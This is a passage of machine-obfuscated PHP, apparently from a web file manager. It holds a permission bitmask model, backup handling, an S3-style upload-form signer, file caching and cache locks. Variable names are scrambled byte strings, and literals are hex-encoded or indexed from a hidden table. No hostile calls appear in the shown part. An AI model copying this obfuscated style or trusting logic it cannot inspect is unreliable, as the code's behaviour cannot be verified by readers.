array($²ç‰é Û[79] => (int) $ìş¢Êã, $²ç‰é Û[1919] => (int) $–“È®¾°); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ÑÇÑƒË° =& $_SERVER[¡¬ıÜ ƒ]; $¤¾ßç§ = array(array($ÑÇÑƒË°[496] => LNG($ÑÇÑƒË°[1987]), $ÑÇÑƒË°[1988] => $ÑÇÑƒË°[1989], $ÑÇÑƒË°[1990] => 1, $ÑÇÑƒË°[1991] => 1, $ÑÇÑƒË°[1992] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÑÇÑƒË°[496] => LNG($ÑÇÑƒË°[1993]), $ÑÇÑƒË°[1988] => $ÑÇÑƒË°[1994], $ÑÇÑƒË°[1990] => 2, $ÑÇÑƒË°[1991] => 1, $ÑÇÑƒË°[1992] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÑÇÑƒË°[496] => LNG($ÑÇÑƒË°[1995]), $ÑÇÑƒË°[1988] => $ÑÇÑƒË°[1996], $ÑÇÑƒË°[1990] => 3, $ÑÇÑƒË°[1991] => 1, $ÑÇÑƒË°[1992] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÑÇÑƒË°[496] => LNG($ÑÇÑƒË°[1997]), $ÑÇÑƒË°[1988] => $ÑÇÑƒË°[1998], $ÑÇÑƒË°[1990] => 4, $ÑÇÑƒË°[1991] => 1, $ÑÇÑƒË°[1992] => self::AUTH_SHOW | self::AUTH_VIEW), array($ÑÇÑƒË°[496] => LNG($ÑÇÑƒË°[1999]), $ÑÇÑƒË°[1988] => $ÑÇÑƒË°[2000], $ÑÇÑƒË°[1990] => 5, $ÑÇÑƒË°[1991] => 1, $ÑÇÑƒË°[1992] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ÑÇÑƒË°[496] => LNG($ÑÇÑƒË°[2001]), $ÑÇÑƒË°[1988] => $ÑÇÑƒË°[2002], $ÑÇÑƒË°[1990] => 6, $ÑÇÑƒË°[1991] => 1, $ÑÇÑƒË°[1992] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ÑÇÑƒË°[496] => LNG($ÑÇÑƒË°[2003]), $ÑÇÑƒË°[1988] => $ÑÇÑƒË°[2004], $ÑÇÑƒË°[1990] => 7, $ÑÇÑƒË°[1991] => 1, $ÑÇÑƒË°[1992] => 0)); return $¤¾ßç§; } public static function authCheck($°Ùæûş, $ÑÒ³Â’ˆ) { $ÍùÑË‘Æ =& $_SERVER[¡¬ıÜ ƒ]; $°Ùæûş = intval($°Ùæûş); if (KodUser::isRoot() && $GLOBALS[$ÍùÑË‘Æ[6]][$ÍùÑË‘Æ[2005]]) { return !0; } if ($°Ùæûş <= 0) { return !1; } if (($°Ùæûş & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($°Ùæûş & $ÑÒ³Â’ˆ); } public static function authCheckShow($ùÌ¹äèĞ) { return self::authCheck($ùÌ¹äèĞ, self::AUTH_SHOW); } public static function authCheckView($à¸Åâîé) { return self::authCheck($à¸Åâîé, self::AUTH_VIEW); } public static function authCheckDownload($•Å†ùÕ) { return self::authCheck($•Å†ùÕ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ä•œİ±ı) { return self::authCheck($ä•œİ±ı, self::AUTH_UPLOAD); } public static function authCheckEdit($·±ß›É¯) { return self::authCheck($·±ß›É¯, self::AUTH_EDIT); } public static function authCheckRemove($°£˜„ê‰) { return self::authCheck($°£˜„ê‰, self::AUTH_REMOVE); } public static function authCheckShare($™ÏúáÃİ) { return self::authCheck($™ÏúáÃİ, self::AUTH_SHARE); } public static function authCheckComment($™ûøÃ‹•) { return self::authCheck($™ûøÃ‹•, self::AUTH_COMMENT); } public static function authCheckEvent($ğŞß‘™¼) { return self::authCheck($ğŞß‘™¼, self::AUTH_EVENT); } public static function authCheckRoot($¤şÂåì÷) { return self::authCheck($¤şÂåì÷, self::AUTH_ROOT); } public static function authCheckAction($ğ£³‰•¾, $Ö÷ÇıÓØ) { $ÆŞşäß =& $_SERVER[¡¬ıÜ ƒ]; $Œ÷ƒôƒ¤ = array($ÆŞşäß[2006] => self::AUTH_VIEW, $ÆŞşäß[1290] => self::AUTH_DOWNLOAD, $ÆŞşäß[110] => self::AUTH_UPLOAD, $ÆŞşäß[1955] => self::AUTH_EDIT, $ÆŞşäß[1954] => self::AUTH_REMOVE, $ÆŞşäß[1965] => self::AUTH_SHARE, $ÆŞşäß[431] => self::AUTH_COMMENT, $ÆŞşäß[1772] => self::AUTH_EVENT, $ÆŞşäß[2007] => self::AUTH_ROOT); if (!isset($Œ÷ƒôƒ¤[$Ö÷ÇıÓØ])) { return; } $÷”Û¸­š = $Œ÷ƒôƒ¤[$Ö÷ÇıÓØ]; $ğ£³‰•¾ = intval($ğ£³‰•¾); if ($ğ£³‰•¾ <= 0) { return !1; } if (($ğ£³‰•¾ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ğ£³‰•¾ & $÷”Û¸­š); } public static function authDisable($¢âï›îŞ, $€¿…”—¾) { if (intval($¢âï›îŞ) <= 0) { return 0; } return intval($¢âï›îŞ) & ~$€¿…”—¾; } public $optionType = "\x53\171\163\x74\x65\x6d\56\163\x6f\x75\x72\143\x65\101\165\164\150\114\x69\163\164"; public $field = array("\156\x61\155\x65", "\x61\x75\164\150", "\x6c\x61\x62\x65\154", "\x64\151\163\160\154\x61\x79", "\x73\x79\163\164\x65\x6d", "\x73\x6f\x72\x74"); public function initData() { $åç”ê‰™ = $this->authDefault(); foreach ($åç”ê‰™ as $Éßˆƒ´) { $this->add($Éßˆƒ´); } } public function findAuth($ÅØ¡›¡’, $ù¥èñ”œ) { $ú€èò™‰ =& $_SERVER[¡¬ıÜ ƒ]; $·À¥£• = parent::listData(); foreach ($·À¥£• as $Ì €¯àú) { $ÛêµÒó = intval($Ì €¯àú[$ú€èò™‰[489]]); if ($ÛêµÒó <= 0 || $Ì €¯àú[$ú€èò™‰[2008]] == 0) { continue; } if (($ÛêµÒó & $ÅØ¡›¡’) != $ÅØ¡›¡’) { continue; } if (($ÛêµÒó & $ù¥èñ”œ) != 0) { continue; } return $Ì €¯àú[$ú€èò™‰[477]]; } return !1; } public function findAuthMax($—‹´ı”·, $¶¢ÒÛÑ) { $‚§¤®Éœ =& $_SERVER[¡¬ıÜ ƒ]; $ö£©Öíê = !1; $ÏŠÅÓ Ş = parent::listData(); foreach ($ÏŠÅÓ Ş as $ß°â—ğî) { $×¡ğ«€ = intval($ß°â—ğî[$‚§¤®Éœ[489]]); if ($×¡ğ«€ <= 0 || $ß°â—ğî[$‚§¤®Éœ[2008]] == 0) { continue; } if (($×¡ğ«€ & $—‹´ı”·) != $—‹´ı”·) { continue; } if (($×¡ğ«€ & $¶¢ÒÛÑ) != 0) { continue; } if (!$ö£©Öíê) { $ö£©Öíê = $ß°â—ğî; continue; } if (intval($ö£©Öíê[$‚§¤®Éœ[489]]) < $×¡ğ«€) { $ö£©Öíê = $ß°â—ğî; } } return $ö£©Öíê ? $ö£©Öíê[$‚§¤®Éœ[477]] : !1; } public function findAuthReadOnly() { $ù—é¾Š = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $³„ó–¯É = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ù—é¾Š, $³„ó–¯É); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $úÈşä¥É =& $_SERVER[¡¬ıÜ ƒ]; $¬°î¿äŠ = parent::listData(); $©„ÁªÊ„ = !1; foreach ($¬°î¿äŠ as $àÃŸº‡á) { if ($àÃŸº‡á[$úÈşä¥É[489]] <= 0 || $àÃŸº‡á[$úÈşä¥É[2008]] == $úÈşä¥É[230]) { continue; } if (!$©„ÁªÊ„) { $©„ÁªÊ„ = $àÃŸº‡á; continue; } if ($©„ÁªÊ„[$úÈşä¥É[489]] > $àÃŸº‡á[$úÈşä¥É[489]]) { $©„ÁªÊ„ = $àÃŸº‡á; } } return $©„ÁªÊ„ ? $©„ÁªÊ„[$úÈşä¥É[477]] : $úÈşä¥É[12]; } public function listData($Œ¨İâ´» = false, $Õ””Ï†’ = "\x73\x6f\x72\x74", $ÀüîÉõà = false) { return parent::listData($Œ¨İâ´», $Õ””Ï†’, $ÀüîÉõà); } public function update($çÈ÷ñ, $åø¥ÅÍ€) { $ñÛš¤ä =& $_SERVER[¡¬ıÜ ƒ]; $ÛÅŞšìŸ = parent::listData($çÈ÷ñ); $ ”ª¢³‘ = $this->findByName($åø¥ÅÍ€[$ñÛš¤ä[32]]); if (!$ÛÅŞšìŸ || $ ”ª¢³‘ && $ ”ª¢³‘[$ñÛš¤ä[477]] != $ÛÅŞšìŸ[$ñÛš¤ä[477]]) { return !1; } $this->filterAuth($åø¥ÅÍ€[$ñÛš¤ä[489]]); return parent::update($çÈ÷ñ, $åø¥ÅÍ€); } public function remove($‹˜¶§¡€) { $¶ÚÌ–Ÿ¥ = parent::listData($‹˜¶§¡€); if (!$¶ÚÌ–Ÿ¥ || $¶ÚÌ–Ÿ¥[$_SERVER[¡¬ıÜ ƒ][191]]) { return !1; } return parent::remove($‹˜¶§¡€); } public function add($ù’½ûš = array()) { $µŒÊˆÖÒ =& $_SERVER[¡¬ıÜ ƒ]; if ($this->findByName($ù’½ûš[$µŒÊˆÖÒ[32]])) { return !1; } $›“¤–¶ = array($µŒÊˆÖÒ[32] => $µŒÊˆÖÒ[12], $µŒÊˆÖÒ[489] => 1, $µŒÊˆÖÒ[2009] => $µŒÊˆÖÒ[1996], $µŒÊˆÖÒ[2008] => 1, $µŒÊˆÖÒ[191] => 0, $µŒÊˆÖÒ[2010] => 0); $ù’½ûš = array_merge($›“¤–¶, $ù’½ûš); $ù’½ûš[$µŒÊˆÖÒ[2010]] = $this->getSort(); $this->filterAuth($ù’½ûš[$µŒÊˆÖÒ[489]]); return parent::insert($ù’½ûš); } private function getSort() { $×¸ÉÛ™É =& $_SERVER[¡¬ıÜ ƒ]; $™…¹í½§ = parent::listData(); $¶ßÉ«¿– = array_to_keyvalue($™…¹í½§, $×¸ÉÛ™É[12], $×¸ÉÛ™É[2010]); return empty($¶ßÉ«¿–) ? 0 : max($¶ßÉ«¿–) + 1; } private function filterAuth(&$àåà§§á) { if (!$àåà§§á) { return; } $ÀÔª¶¾õ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ı£âÀÄğ = array(); foreach ($ÀÔª¶¾õ as $¶Ë¡á¾œ) { if ($àåà§§á & $¶Ë¡á¾œ) { $ı£âÀÄğ[] = $¶Ë¡á¾œ; } } if (in_array(self::AUTH_ROOT, $ı£âÀÄğ)) { $àåà§§á = array_sum($ÀÔª¶¾õ); return; } $Ôö­§ú = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ı£âÀÄğ as $¶Ë¡á¾œ) { if (isset($Ôö­§ú[$¶Ë¡á¾œ])) { $ı£âÀÄğ = array_merge($ı£âÀÄğ, $Ôö­§ú[$¶Ë¡á¾œ]); } } $ı£âÀÄğ[] = self::AUTH_SHOW; $àåà§§á = array_sum(array_unique($ı£âÀÄğ)); } public function sort($ä–İ°Å¿, $±Š‰Ÿ¯¯) { return parent::update($ä–İ°Å¿, $±Š‰Ÿ¯¯); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\142\141\143\x6b\165\x70\x4c\151\x73\164"; public $field = array("\x69\x6f", "\156\141\155\x65", "\163\164\x61\164\x75\x73", "\x63\157\x6e\x74\x65\156\164", "\155\141\156\165\141\154", "\162\x65\163\165\154\164", "\164\x69\x6d\x65\106\x72\157\155", "\164\x69\155\145\124\x6f"); public function config() { $·ßúòéÓ =& $_SERVER[¡¬ıÜ ƒ]; Action($·ßúòéÓ[2011])->taskInit(); $ˆ†Ûúç = Model($·ßúòéÓ[850])->get($·ßúòéÓ[872]); $ˆ†Ûúç = json_decode($ˆ†Ûúç, !0); $ˆ†Ûúç = is_array($ˆ†Ûúç) ? $ˆ†Ûúç : array(); $this->parseContent($ˆ†Ûúç); unset($ˆ†Ûúç[$·ßúòéÓ[1754]]); Model($·ßúòéÓ[1753])->cacheClear(); $Á˜¼ŠÊù = $·ßúòéÓ[2012]; $ñŒã‚õß = Model($·ßúòéÓ[2013])->findByKey($·ßúòéÓ[1772], $Á˜¼ŠÊù); if (!$ñŒã‚õß) { $ñŒã‚õß = array(); } if (isset($ñŒã‚õß[$·ßúòéÓ[206]])) { $ñŒã‚õß[$·ßúòéÓ[206]] = json_decode($ñŒã‚õß[$·ßúòéÓ[206]], !0); } if (isset($ˆ†Ûúç[$·ßúòéÓ[206]])) { $ñŒã‚õß[$·ßúòéÓ[206]][$·ßúòéÓ[1757]] = $ˆ†Ûúç[$·ßúòéÓ[206]]; unset($ˆ†Ûúç[$·ßúòéÓ[206]]); } return array_merge($ñŒã‚õß, $ˆ†Ûúç); } public function listData($¦¯Ì×ó÷ = false, $¿´ƒ­ = "\x6d\x6f\144\151\146\x79\124\x69\x6d\145", $¸·²ØÎÜ = false) { $®ñüä– = parent::listData($¦¯Ì×ó÷, $¿´ƒ­, !0); if (!$®ñüä–) { return $®ñüä–; } if ($¦¯Ì×ó÷) { $®ñüä– = array($®ñüä–); } foreach ($®ñüä– as &$¦Ï×Ó) { $this->parseContent($¦Ï×Ó); } return $¦¯Ì×ó÷ ? $®ñüä–[0] : $®ñüä–; } public function parseContent(&$Í±°ûé•) { $ÃºâÉ“ =& $_SERVER[¡¬ıÜ ƒ]; $Œˆ‘ß ö = _get($Í±°ûé•, $ÃºâÉ“[171], $ÃºâÉ“[91]); if (!in_array($Œˆ‘ß ö, array($ÃºâÉ“[856], $ÃºâÉ“[1220]))) { $Í±°ûé•[$ÃºâÉ“[171]] = $Œˆ‘ß ö == $ÃºâÉ“[91] ? $ÃºâÉ“[1220] : $ÃºâÉ“[856]; } } public function lastItem() { $äè¬ ÈÛ = $this->listData(); return !empty($äè¬ ÈÛ[0]) ? $äè¬ ÈÛ[0] : null; } public function kill($Ûòİ´Ê¥) { $Ã½ßÈ¥Ï =& $_SERVER[¡¬ıÜ ƒ]; $‡ºÊ´şı = $this->listData($Ûòİ´Ê¥); if (!$‡ºÊ´şı || empty($‡ºÊ´şı[$Ã½ßÈ¥Ï[32]])) { return !0; } Task::kill($Ã½ßÈ¥Ï[871]); Task::kill($Ã½ßÈ¥Ï[890]); Task::kill($Ã½ßÈ¥Ï[899]); $¾˜ úåé = $‡ºÊ´şı[$Ã½ßÈ¥Ï[32]]; $íçş•Ÿ = TEMP_FILES . $Ã½ßÈ¥Ï[867] . $¾˜ úåé . $Ã½ßÈ¥Ï[8]; IO::remove($íçş•Ÿ, !1); return $this->remove($Ûòİ´Ê¥); } public function remove($é‘»¬«ª) { $œ€Ã†” = $this->listData($é‘»¬«ª); if (!$œ€Ã†”) { return !0; } return $this->backupRemove($œ€Ã†”); } private function backupRemove($¦ˆ ¶Åê) { parent::remove($¦ˆ ¶Åê[$_SERVER[¡¬ıÜ ƒ][477]]); $¨®ÉËı¨ = $this->backupPath($¦ˆ ¶Åê); IO::remove($¨®ÉËı¨, !1); return !0; } private function backupPath($ÀÆÅéé) { $¯ ®êÓ =& $_SERVER[¡¬ıÜ ƒ]; $–®¾Ï»Ä = $ÀÆÅéé[$¯ ®êÓ[32]]; $ı×è£ì = Model($¯ ®êÓ[850])->get($¯ ®êÓ[851]); $ª‘Ûˆ¬ı = substr(md5($¯ ®êÓ[852] . $ı×è£ì . $–®¾Ï»Ä), 0, 8); return "\173\151\157\x3a{$ÀÆÅéé[$¯ ®êÓ[832]]}\x7d\x2f\144\x61\164\x61\x62\141\x73\145\57\142\141\143\153\x75\160\57" . $–®¾Ï»Ä . $¯ ®êÓ[11] . $ª‘Ûˆ¬ı; } public function start() { $²æ¡³ =& $_SERVER[¡¬ıÜ ƒ]; if ($GLOBALS[$²æ¡³[6]][$²æ¡³[92]][$²æ¡³[2014]] != $²æ¡³[91]) { return !0; } $‰Ö“–å = $this->config(); if (!$‰Ö“–å || $‰Ö“–å[$²æ¡³[1754]] != $²æ¡³[91]) { return !1; } if ($‰Ö“–å[$²æ¡³[171]] == $²æ¡³[856]) { $‹¨äßĞ = Model($²æ¡³[850])->get($²æ¡³[1335]); if ($‹¨äßĞ == $²æ¡³[1336]) { $‰Ö“–å[$²æ¡³[171]] = $²æ¡³[1220]; } } $¼Â–·­Ú = $this->process(); foreach ($¼Â–·­Ú as $ı®‰·Â) { if ($ı®‰·Â) { return Task::restart($ı®‰·Â[$²æ¡³[477]]); } } $ŒñŸ¥Ñì = new Backup(); $ŒçÜé³Í = $ŒñŸ¥Ñì->db(); if ($ŒçÜé³Í) { $ŒçÜé³Í = $ŒñŸ¥Ñì->dbFile(); if ($ŒçÜé³Í && $‰Ö“–å[$²æ¡³[171]] == $²æ¡³[856]) { $ŒçÜé³Í = $ŒñŸ¥Ñì->file(); } } Backup::set(array($²æ¡³[830] => 1, $²æ¡³[841] => time())); return !0; } public function process() { $ƒ¿–áÒø =& $_SERVER[¡¬ıÜ ƒ]; $ˆŒ’İ™Ú = array($ƒ¿–áÒø[837] => Task::get($ƒ¿–áÒø[871]), $ƒ¿–áÒø[842] => Task::get($ƒ¿–áÒø[890]), $ƒ¿–áÒø[232] => Task::get($ƒ¿–áÒø[899])); $¸­à± = !1; foreach ($ˆŒ’İ™Ú as &$ïŸåÑ¬‘) { if ($¸­à±) { $ïŸåÑ¬‘ = !1; continue; } if ($ïŸåÑ¬‘) { $×‡²Ê¬Á = intval(_get($ïŸåÑ¬‘, $ƒ¿–áÒø[1790], 0)); if (time() - $×‡²Ê¬Á > 7200) { Task::kill($ïŸåÑ¬‘[$ƒ¿–áÒø[477]]); $¸­à± = !0; $ïŸåÑ¬‘ = !1; } } } return $ˆŒ’İ™Ú; } public function restore() { $ŸÁø†ª =& $_SERVER[¡¬ıÜ ƒ]; ActionCall($ŸÁø†ª[1148], !0, 1); ActionCall($ŸÁø†ª[1148], !0, 0); } } goto a­•…ï‡©µ; aàÕ‘Û‡Í: define($_SERVER[¡¬ıÜ ƒ][319], 3); define($_SERVER[¡¬ıÜ ƒ][320], 1); define($_SERVER[¡¬ıÜ ƒ][321], 0); goto Aåñ­‚‚; F¡Õö„ØŞ¸: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÚÅ¬ßò‘) { $this->pathParse = $ÚÅ¬ßò‘; } protected function infoParse($¤ŞÊÌ¡, $¤®‰õ±¶ = false) { $”Ÿ¼¢ì‹ =& $_SERVER[¡¬ıÜ ƒ]; return Action($”Ÿ¼¢ì‹[1267])->sharePathInfo($this->pathParse[$”Ÿ¼¢ì‹[87]], !0, $¤®‰õ±¶); } public function listPath($¿úíâÎĞ, $áï£òŞ¬ = false) { $òã½äøå =& $_SERVER[¡¬ıÜ ƒ]; $şàØÚ = IO::listPath($¿úíâÎĞ, $áï£òŞ¬); if (!$şàØÚ) { return $şàØÚ; } if (is_array($şàØÚ[$òã½äøå[1440]])) { $üáÓşó© = Action($òã½äøå[1449])->parsePathChildren($şàØÚ[$òã½äøå[1440]], array($òã½äøå[497] => $¿úíâÎĞ)); $şàØÚ[$òã½äøå[1440]] = Action($òã½äøå[1267])->shareItemInfo($üáÓşó©); } foreach ($şàØÚ as $×ó¢û => $ö¼ªÈ‡‚) { if (!in_array($×ó¢û, array($òã½äøå[86], $òã½äøå[85]))) { continue; } foreach ($ö¼ªÈ‡‚ as $Ë¯…²Ëè => $üáÓşó©) { $üáÓşó© = Action($òã½äøå[1449])->parsePathChildren($üáÓşó©, array($òã½äøå[497] => $¿úíâÎĞ)); $şàØÚ[$×ó¢û][$Ë¯…²Ëè] = Action($òã½äøå[1267])->shareItemInfo($üáÓşó©); } } return $şàØÚ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¹Éìò¦) { parent::__construct($¹Éìò¦); $this->setSignVersion($_SERVER[¡¬ıÜ ƒ][249]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($İÍáˆÎˆ) { parent::__construct($İÍáˆÎˆ); $this->setSignVersion($_SERVER[¡¬ıÜ ƒ][249]); } public function uploadFormData($ƒµŞµı, $ãîşµ¢ı = 3600) { $ôëÓşø =& $_SERVER[¡¬ıÜ ƒ]; $¦ò¦ë×¡ = $ôëÓşø[231]; $õéÆè¤• = $ôëÓşø[259]; $½ÌáŒ‹Ÿ = $ôëÓşø[62]; $âúÈ·  = gmdate($ôëÓşø[260]); $ìó§ò¢¹ = gmdate($ôëÓşø[261]); $öğÚõ·Ÿ = $ôëÓşø[262]; $ïêˆìİƒ = $ãîşµ¢ı . $ôëÓşø[12]; $‰ù®¢¹½ = $ôëÓşø[263]; $Ù¸±¶–× = array($this->accessKey, $ìó§ò¢¹, $this->region, $½ÌáŒ‹Ÿ, $öğÚõ·Ÿ); $ûË¹çÌ¥ = implode($ôëÓşø[8], $Ù¸±¶–×); $ÌÌÀ¶†® = array($ôëÓşø[264] => gmdate($ôëÓşø[1424], strtotime($ôëÓşø[266])), $ôëÓşø[267] => array(array($ôëÓşø[268] => $this->bucket), array($ôëÓşø[308] => $¦ò¦ë×¡), array($ôëÓşø[269], $ôëÓşø[270], $ôëÓşø[12]), array($ôëÓşø[269], $ôëÓşø[271], $ôëÓşø[12]), array($ôëÓşø[269], $ôëÓşø[309], $ôëÓşø[12]), array($ôëÓşø[272] => $‰ù®¢¹½), array($ôëÓşø[273] => $ûË¹çÌ¥), array($ôëÓşø[274] => $õéÆè¤•), array($ôëÓşø[275] => $âúÈ· ), array($ôëÓşø[276] => $ïêˆìİƒ))); $¸Ğ¬Å­† = base64_encode(json_encode($ÌÌÀ¶†®)); $ı³Ö¯¤‹ = hash_hmac($ôëÓşø[277], $ìó§ò¢¹, $ôëÓşø[278] . $this->secret, !0); $Ø”íèŒë = hash_hmac($ôëÓşø[277], $this->region, $ı³Ö¯¤‹, !0); $ğµÕ³ñæ = hash_hmac($ôëÓşø[277], $½ÌáŒ‹Ÿ, $Ø”íèŒë, !0); $“Í™ü° = hash_hmac($ôëÓşø[277], $öğÚõ·Ÿ, $ğµÕ³ñæ, !0); $ ´ÏÃ¥Â = hash_hmac($ôëÓşø[277], $¸Ğ¬Å­†, $“Í™ü°); $Ó„Ò™ê— = array($ôëÓşø[248] => $ôëÓşø[12], $ôëÓşø[296] => $ôëÓşø[12], $ôëÓşø[308] => $¦ò¦ë×¡, $ôëÓşø[272] => $‰ù®¢¹½, $ôëÓşø[279] => $¸Ğ¬Å­†, $ôëÓşø[310] => $ûË¹çÌ¥, $ôëÓşø[311] => $õéÆè¤•, $ôëÓşø[312] => $âúÈ· , $ôëÓşø[313] => $ïêˆìİƒ, $ôëÓşø[314] => $ ´ÏÃ¥Â, $ôëÓşø[208] => $this->getHost()); return $Ó„Ò™ê—; } } goto Cİìî²‹·; CíöÔµ¼ê: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ß¹¢½Û¼, $ÇÑˆ¡æ) { $íÉ·ÍóÅ =& $_SERVER[¡¬ıÜ ƒ]; $this->cachePath = $ß¹¢½Û¼[$íÉ·ÍóÅ[87]]; $this->prefix = $íÉ·ÍóÅ[924]; $this->cacheTime = $ÇÑˆ¡æ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Û—˜ÈÇ¾) { $¡£ë¯¹ =& $_SERVER[¡¬ıÜ ƒ]; $Û—˜ÈÇ¾ = str_replace(array($¡£ë¯¹[925], $¡£ë¯¹[100], $¡£ë¯¹[76]), $¡£ë¯¹[926], $Û—˜ÈÇ¾); return $this->cachePath . $¡£ë¯¹[927] . $Û—˜ÈÇ¾ . $¡£ë¯¹[928]; } public function set($¬îìêì„, $ùœúÊ±, $†º¡¦ãğ = false) { $†º¡¦ãğ = $†º¡¦ãğ ? $†º¡¦ãğ : $this->cacheTime; $¥À‡ºÃ = $this->getFile($¬îìêì„); if (file_put_contents($¥À‡ºÃ, $this->prefix . $ùœúÊ±, LOCK_EX)) { @touch($¥À‡ºÃ, intval(time() + $†º¡¦ãğ)); clearstatcache(); return !0; } @unlink($¥À‡ºÃ); return !1; } public function get($„íáÇÈÙ) { $ÀºÂ©Ğ™ = $this->getFile($„íáÇÈÙ); if (file_exists($ÀºÂ©Ğ™) && filemtime($ÀºÂ©Ğ™) < time()) { @unlink($ÀºÂ©Ğ™); return !1; } $á¡äØçê = @file_get_contents($ÀºÂ©Ğ™); return substr($á¡äØçê, strlen($this->prefix)); } public function remove($ŸßòÖ¡ì) { $î¨Ê¹« = $this->getFile($ŸßòÖ¡ì); return @unlink($î¨Ê¹«); } public function deleteAll() { $©éì”ñ =& $_SERVER[¡¬ıÜ ƒ]; $ÅÖ‰â³ç = scandir($this->cachePath); foreach ($ÅÖ‰â³ç as $î‡‹ôöè) { $ÓêÉöá– = $this->cachePath . $î‡‹ôöè; if (strpos($ÓêÉöá–, $©éì”ñ[928]) && strpos($ÓêÉöá–, $©éì”ñ[929])) { @unlink($ÓêÉöá–); } } } public function clearTimeout() { $ÓÍ„Ëå =& $_SERVER[¡¬ıÜ ƒ]; $ñÙíŞÑæ = scandir($this->cachePath); foreach ($ñÙíŞÑæ as $ïöÄÌ‡š) { $¸îãóÜ» = $this->cachePath . $ïöÄÌ‡š; if (strpos($¸îãóÜ», $ÓÍ„Ëå[928]) && strpos($¸îãóÜ», $ÓÍ„Ëå[929]) && filemtime($¸îãóÜ») < time()) { @unlink($¸îãóÜ»); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Ø£Ó±ø =& $_SERVER[¡¬ıÜ ƒ]; if (self::$handle) { return self::$handle; } $ñãÏïæ˜ = $GLOBALS[$Ø£Ó±ø[6]][$Ø£Ó±ø[426]]; self::$timeout = $ñãÏïæ˜[$Ø£Ó±ø[930]] ? $ñãÏïæ˜[$Ø£Ó±ø[930]] : 10; $Èñ˜ù¢Ä = _get($GLOBALS[$Ø£Ó±ø[6]], $Ø£Ó±ø[931]); $ÁìŠ¼ş = $ñãÏïæ˜[$Ø£Ó±ø[916]] ? $ñãÏïæ˜[$Ø£Ó±ø[916]] : $Ø£Ó±ø[232]; if ($ÁìŠ¼ş == $Ø£Ó±ø[21] && $Èñ˜ù¢Ä == $Ø£Ó±ø[13]) { $ÁìŠ¼ş = $Ø£Ó±ø[232]; } switch ($ÁìŠ¼ş) { case $Ø£Ó±ø[919]: self::$handle = new CacheLockRedis(); break; case $Ø£Ó±ø[920]: self::$handle = new CacheLockMemcached(); break; case $Ø£Ó±ø[21]: self::$handle = new CacheLockDatabase(); break; case $Ø£Ó±ø[232]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ø£Ó±ø[932], $Ø£Ó±ø[933]); } return self::$handle; } private static function key($â”…ÛŒô) { return $_SERVER[¡¬ıÜ ƒ][934] . Cache::key($â”…ÛŒô); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($‡ÀêëÃß = '') { self::$errorMsg = $‡ÀêëÃß; } public static function lockGlobal($÷µ¹Êåó, $‡ÇŠŸë) { return self::lock($÷µ¹Êåó, $‡ÇŠŸë, !0); } public static function lock($ÃŞÑ¬§ì, $†úÜÃË‡ = false, $úÛÊ†Ÿ = false) { $çš×Ö¦ =& $_SERVER[¡¬ıÜ ƒ]; $ñ—â’”ë = self::init(); $é¦ıªŸò = self::key($ÃŞÑ¬§ì); $†úÜÃË‡ = $†úÜÃË‡ ? $†úÜÃË‡ : self::$timeout; $ñØéä¸ = timeFloat(); if ($GLOBALS[$çš×Ö¦[935]]) { if (!$ñ—â’”ë->lock($é¦ıªŸò, 0.2)) { die; } return !0; } $ê¡¹Ò· = $ñ—â’”ë->lock($é¦ıªŸò, $†úÜÃË‡); $ú±¶ß±’ = timeFloat(); if (!$ê¡¹Ò·) { $öºÃÎ‡¶ = 